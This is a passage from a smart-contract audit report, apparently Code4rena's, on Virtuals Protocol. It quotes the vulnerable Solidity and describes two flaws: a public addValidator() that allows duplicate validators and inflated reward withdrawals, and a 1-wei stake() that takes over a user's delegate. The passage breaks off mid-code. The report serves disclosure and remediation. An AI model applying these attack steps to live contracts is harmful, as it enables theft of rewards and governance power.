<h1 style="position:relative;" id="severity-criteria"><a class="anchor before" aria-label="severity criteria permalink" href="#severity-criteria"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Severity Criteria</h1>
<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>
<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>
<ul>
<li>Malicious Input Handling</li>
<li>Escalation of privileges</li>
<li>Arithmetic</li>
<li>Gas use</li>
</ul>
<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href="https://code4rena.com">the C4 website</a>, specifically our section on <a href="https://docs.code4rena.com/awarding/judging-criteria/severity-categorization">Severity Categorization</a>.</p>
<h1 style="position:relative;" id="high-risk-findings-6"><a class="anchor before" aria-label="high risk findings 6 permalink" href="#high-risk-findings-6"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>High Risk Findings (6)</h1>
<h2 style="position:relative;" id="h-01-lack-of-access-control-in-agentnftv2addvalidator-enables-unauthorized-validator-injection-and-causes-reward-accounting-inconsistencies"><a class="anchor before" aria-label="h 01 lack of access control in agentnftv2addvalidator enables unauthorized validator injection and causes reward accounting inconsistencies permalink" href="#h-01-lack-of-access-control-in-agentnftv2addvalidator-enables-unauthorized-validator-injection-and-causes-reward-accounting-inconsistencies"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-3">[H-01] Lack of access control in <code>AgentNftV2::addValidator()</code> enables unauthorized validator injection and causes reward accounting inconsistencies</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-292">joicygiore</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-510">Astroboy</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-803">BRONZEDISC</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-287">classic-k</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-703">CoheeYang</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-621">Damboy</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-748">DanielTan_MetaTrust</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-134">danzero</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-190">debo</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-5">gmh5225</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-392">gregom</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-649">hail_the_lord</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-640">hecker_trieu_tien</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-80">hirosyama</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-397">holtzzx</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-323">io10</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-443">levi_104</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-820">Olugbenga</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-515">PotEater</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-647">shui</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-459">testnate</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentNftV2.sol#L133-L139">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentNftV2.sol#L133-L139</a></p>
<p>The <code>AgentNftV2::addValidator()</code> function lacks any form of access control. While the <code>mint()</code> function of <code>AgentNftV2</code> does enforce role-based restrictions (<code>MINTER_ROLE</code>), a malicious actor can exploit the <code>AgentFactoryV2::executeApplication()</code> logic to predict and obtain the next <code>virtualId</code> through a call to <code>IAgentNft(nft).nextVirtualId()</code>.</p>
<p>By doing so, an attacker can preemptively call <code>addValidator()</code> and append a validator to <code>_validators[virtualId]</code>. Later, when <code>AgentNftV2::mint()</code> is called, it invokes <code>_addValidator()</code> again, causing the validator to be added a second time. This results in a duplicate validator entry for the same virtual ID.</p>
<pre data-index="0" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    // AgentNftV2::mint()</span></span>
<span class="grvsc-line"><span class="grvsc-source">    function mint(</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 virtualId,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        address to,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        string memory newTokenURI,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        address payable theDAO,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        address founder,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint8[] memory coreTypes,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        address pool,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        address token</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ) external onlyRole(MINTER_ROLE) returns (uint256) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        require(virtualId == _nextVirtualId, "Invalid virtualId");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        _nextVirtualId++;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        _mint(to, virtualId);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        _setTokenURI(virtualId, newTokenURI);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        VirtualInfo storage info = virtualInfos[virtualId];</span></span>
<span class="grvsc-line"><span class="grvsc-source">        info.dao = theDAO;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        info.coreTypes = coreTypes;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        info.founder = founder;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        IERC5805 daoToken = GovernorVotes(theDAO).token();</span></span>
<span class="grvsc-line"><span class="grvsc-source">        info.token = token;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">VirtualLP storage lp = virtualLPs[virtualId];</span></span>
<span class="grvsc-line"><span class="grvsc-source">        lp.pool = pool;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        lp.veToken = address(daoToken);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">_stakingTokenToVirtualId[address(daoToken)] = virtualId;</span></span>
<span class="grvsc-line"><span class="grvsc-source">@&gt;        _addValidator(virtualId, founder);</span></span>
<span class="grvsc-line"><span class="grvsc-source">@&gt;        _initValidatorScore(virtualId, founder);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        return virtualId;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // AgentNftV2::addValidator()</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Expected to be called by `AgentVeToken::stake()` function</span></span>
<span class="grvsc-line"><span class="grvsc-source">    function addValidator(uint256 virtualId, address validator) public {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        if (isValidator(virtualId, validator)) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            return;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">        _addValidator(virtualId, validator);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        _initValidatorScore(virtualId, validator);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // ValidatorRegistry::_addValidator()</span></span>
<span class="grvsc-line"><span class="grvsc-source">    function _addValidator(uint256 virtualId, address validator) internal {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        _validatorsMap[virtualId][validator] = true;</span></span>
<span class="grvsc-line"><span class="grvsc-source">@&gt;        _validators[virtualId].push(validator);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        emit NewValidator(virtualId, validator);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span></code></pre>
<pre data-index="1" data-language="js" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// AgentFactoryV2::executeApplication() </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">executeApplication</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">id</span><span class="mtk1">, </span><span class="mtk12">bool</span><span class="mtk1"> </span><span class="mtk12">canStake</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> </span><span class="mtk11">noReentrant</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// This will bootstrap an Agent with following components:</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// C1: Agent Token</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// C2: LP Pool + Initial liquidity</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// C3: Agent veToken</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// C4: Agent DAO</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// C5: Agent NFT</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// C6: TBA</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// C7: Stake liquidity token to get veToken</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// SNIP...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// C5</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">@&gt;        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1"> = </span><span class="mtk11">IAgentNft</span><span class="mtk1">(</span><span class="mtk12">nft</span><span class="mtk1">).</span><span class="mtk11">nextVirtualId</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">@&gt;        </span><span class="mtk11">IAgentNft</span><span class="mtk1">(</span><span class="mtk12">nft</span><span class="mtk1">).</span><span class="mtk11">mint</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">virtualId</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_vault</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">application</span><span class="mtk1">.</span><span class="mtk12">tokenURI</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">dao</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">application</span><span class="mtk1">.</span><span class="mtk12">proposer</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">application</span><span class="mtk1">.</span><span class="mtk12">cores</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">lp</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">token</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">application</span><span class="mtk1">.</span><span class="mtk12">virtualId</span><span class="mtk1"> = </span><span class="mtk12">virtualId</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// SNIP...</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>The reward mechanism in <code>AgentRewardV2</code> relies on iterating over validator lists to compute and distribute rewards. If a validator is duplicated due to the aforementioned issue, the reward distribution logic - particularly in <code>_distributeValidatorRewards()</code> — recalculates and overwrites the validator’s rewards.</p>
<p>This does not break reward allocation for individual validators due to overwriting. However, the shared variable <code>validatorPoolRewards</code> accumulates validator-level residuals multiple times due to the duplicated validator entries. As a result, <code>validatorPoolRewards</code> can become overstated relative to the actual token amount deposited.</p>
<p>When <code>withdrawValidatorPoolRewards()</code> is eventually called, it transfers this erroneously accumulated excess amount to the designated address. This reduces the contract’s balance below what is required to cover valid validator rewards, ultimately resulting in reward claim failures unless someone manually tops up the shortfall.</p>
<pre data-index="2" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">    // AgentRewardV2::distributeRewards()</span></span>
<span class="grvsc-line"><span class="grvsc-source">    function distributeRewards(uint256 amount) public onlyGov returns (uint32) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        require(amount &gt; 0, "Invalid amount");</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">@&gt;        IERC20(rewardToken).safeTransferFrom(_msgSender(), address(this), amount);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        RewardSettingsCheckpoints.RewardSettings memory settings = getRewardSettings();</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 protocolShares = _distributeProtocolRewards(amount);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 agentShares = amount - protocolShares;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        _prepareAgentsRewards(agentShares, settings);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        return SafeCast.toUint32(_mainRewards.length - 1);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // AgentRewardV2::_distributeValidatorRewards()</span></span>
<span class="grvsc-line"><span class="grvsc-source">    function _distributeValidatorRewards(</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 amount,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 virtualId,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint48 rewardId,</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 totalStaked</span></span>
<span class="grvsc-line"><span class="grvsc-source">    ) private {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        IAgentNft nft = IAgentNft(agentNft);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        // Calculate weighted validator shares</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 validatorCount = nft.validatorCount(virtualId);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        uint256 totalProposals = nft.totalProposals(virtualId);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        for (uint256 i = 0; i &lt; validatorCount; i++) {</span></span>
<span class="grvsc-line"><span class="grvsc-source">            address validator = nft.validatorAt(virtualId, i);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">            // Get validator revenue by votes weightage</span></span>
<span class="grvsc-line"><span class="grvsc-source">            address stakingAddress = getVirtualTokenAddress(nft, virtualId);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            uint256 votes = IERC5805(stakingAddress).getVotes(validator);</span></span>
<span class="grvsc-line"><span class="grvsc-source">            uint256 validatorRewards = (amount * votes) / totalStaked;</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">            // Calc validator reward based on participation rate</span></span>
<span class="grvsc-line"><span class="grvsc-source">            uint256 participationReward = totalProposals == 0</span></span>
<span class="grvsc-line"><span class="grvsc-source">                ? 0</span></span>
<span class="grvsc-line"><span class="grvsc-source">                : (validatorRewards * nft.validatorScore(virtualId, validator)) / totalProposals;</span></span>
<span class="grvsc-line"><span class="grvsc-source">@&gt;            _validatorRewards[validator][rewardId] = participationReward;</span></span>
<span class="grvsc-line"><span class="grvsc-source">@&gt;            validatorPoolRewards += validatorRewards - participationReward;</span></span>
<span class="grvsc-line"><span class="grvsc-source">        }</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // AgentRewardV2::withdrawValidatorPoolRewards()</span></span>
<span class="grvsc-line"><span class="grvsc-source">    function withdrawValidatorPoolRewards(address recipient) external onlyGov {</span></span>
<span class="grvsc-line"><span class="grvsc-source">        require(validatorPoolRewards &gt; 0, "No validator pool rewards");</span></span>
<span class="grvsc-line"><span class="grvsc-source">        IERC20(rewardToken).safeTransfer(recipient, validatorPoolRewards);</span></span>
<span class="grvsc-line"><span class="grvsc-source">        validatorPoolRewards = 0;</span></span>
<span class="grvsc-line"><span class="grvsc-source">    }</span></span></code></pre>
<h3 style="position:relative;" id="recommended-mitigation-steps"><a class="anchor before" aria-label="recommended mitigation steps permalink" href="#recommended-mitigation-steps"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Add access control to <code>addValidator()</code>:</p>
<pre data-index="3" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">- function addValidator(uint256 virtualId, address validator) public {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+ function addValidator(uint256 virtualId, address validator) public onlyRole(VALIDATOR_ADMIN_ROLE) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    if (isValidator(virtualId, validator)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        return;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    _addValidator(virtualId, validator);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    _initValidatorScore(virtualId, validator);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p><strong>Virtuals marked as informative</strong></p>
<hr>
<h2 style="position:relative;" id="h-02-anybody-can-control-a-users-delegate-by-calling-agentvetokenstake-with-1-wei"><a class="anchor before" aria-label="h 02 anybody can control a users delegate by calling agentvetokenstake with 1 wei permalink" href="#h-02-anybody-can-control-a-users-delegate-by-calling-agentvetokenstake-with-1-wei"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-5">[H-02] Anybody can control a user’s delegate by calling <code>AgentVeToken.stake()</code> with 1 wei</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-94">BowTiedOriole</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-299">0x1982us</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-406">BlackAdam</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-755">chupinexx</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-141">Egbe</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-151">Ishenxx</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-701">natachi</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-698">Pelz</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentVeToken.sol#L80">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentVeToken.sol#L80</a></p>
<p><code>AgentVeToken.stake()</code> function will automatically update the delegatee for the receiver. A malicious user can stake 1 wei of the LP token, set the receiver to be a user with an high balance of the veTokens, and set themselves as the delegatee. </p>
<pre data-index="4" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">stake</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">receiver</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">delegatee</span><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">canStake</span><span class="mtk1"> || </span><span class="mtk11">totalSupply</span><span class="mtk1">() == </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk8">"Staking is disabled for private agent"</span><span class="mtk1">); </span><span class="mtk3">// Either public or first staker</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">sender</span><span class="mtk1"> = </span><span class="mtk11">_msgSender</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">amount</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span><span class="mtk1">, </span><span class="mtk8">"Cannot stake 0"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">assetToken</span><span class="mtk1">).</span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">) &gt;= </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk8">"Insufficient asset token balance"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">assetToken</span><span class="mtk1">).</span><span class="mtk11">allowance</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">)) &gt;= </span><span class="mtk12">amount</span><span class="mtk1">, </span><span class="mtk8">"Insufficient asset token allowance"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">IAgentNft</span><span class="mtk1"> </span><span class="mtk12">registry</span><span class="mtk1"> = </span><span class="mtk11">IAgentNft</span><span class="mtk1">(</span><span class="mtk12">agentNft</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">virtualId</span><span class="mtk1"> = </span><span class="mtk12">registry</span><span class="mtk1">.</span><span class="mtk11">stakingTokenToVirtualId</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">require</span><span class="mtk1">(!</span><span class="mtk12">registry</span><span class="mtk1">.</span><span class="mtk11">isBlacklisted</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">), </span><span class="mtk8">"Agent Blacklisted"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk11">totalSupply</span><span class="mtk1">() == </span><span class="mtk7">0</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">initialLock</span><span class="mtk1"> = </span><span class="mtk12">amount</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">registry</span><span class="mtk1">.</span><span class="mtk11">addValidator</span><span class="mtk1">(</span><span class="mtk12">virtualId</span><span class="mtk1">, </span><span class="mtk12">delegatee</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">IERC20</span><span class="mtk1">(</span><span class="mtk12">assetToken</span><span class="mtk1">).</span><span class="mtk11">safeTransferFrom</span><span class="mtk1">(</span><span class="mtk12">sender</span><span class="mtk1">, </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">), </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">_mint</span><span class="mtk1">(</span><span class="mtk12">receiver</span><span class="mtk1">, </span><span class="mtk12">amount</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk11">_delegate</span><span class="mtk1">(</span><span class="mtk12">receiver</span><span class="mtk1">, </span><span class="mtk12">delegatee</span><span class="mtk1">); </span><span class="mtk3">// @audit-high Anybody can change delegate if they stake 1 wei LP</span></span></span>
